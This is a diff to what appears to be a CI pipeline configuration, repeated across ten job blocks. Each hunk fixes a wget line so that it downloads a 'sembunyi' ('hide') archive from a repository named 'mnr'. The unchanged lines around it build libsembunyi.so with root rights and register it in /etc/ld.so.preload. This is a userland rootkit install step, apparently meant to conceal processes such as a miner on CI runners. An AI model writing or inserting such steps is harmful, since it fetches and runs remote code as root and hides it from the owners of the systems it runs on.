@@ -12,7 +12,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -37,7 +37,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -62,7 +62,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -87,7 +87,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -112,7 +112,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -137,7 +137,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -162,7 +162,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -187,7 +187,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -212,7 +212,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
@@ -237,7 +237,7 @@ jobs:
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz && cd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
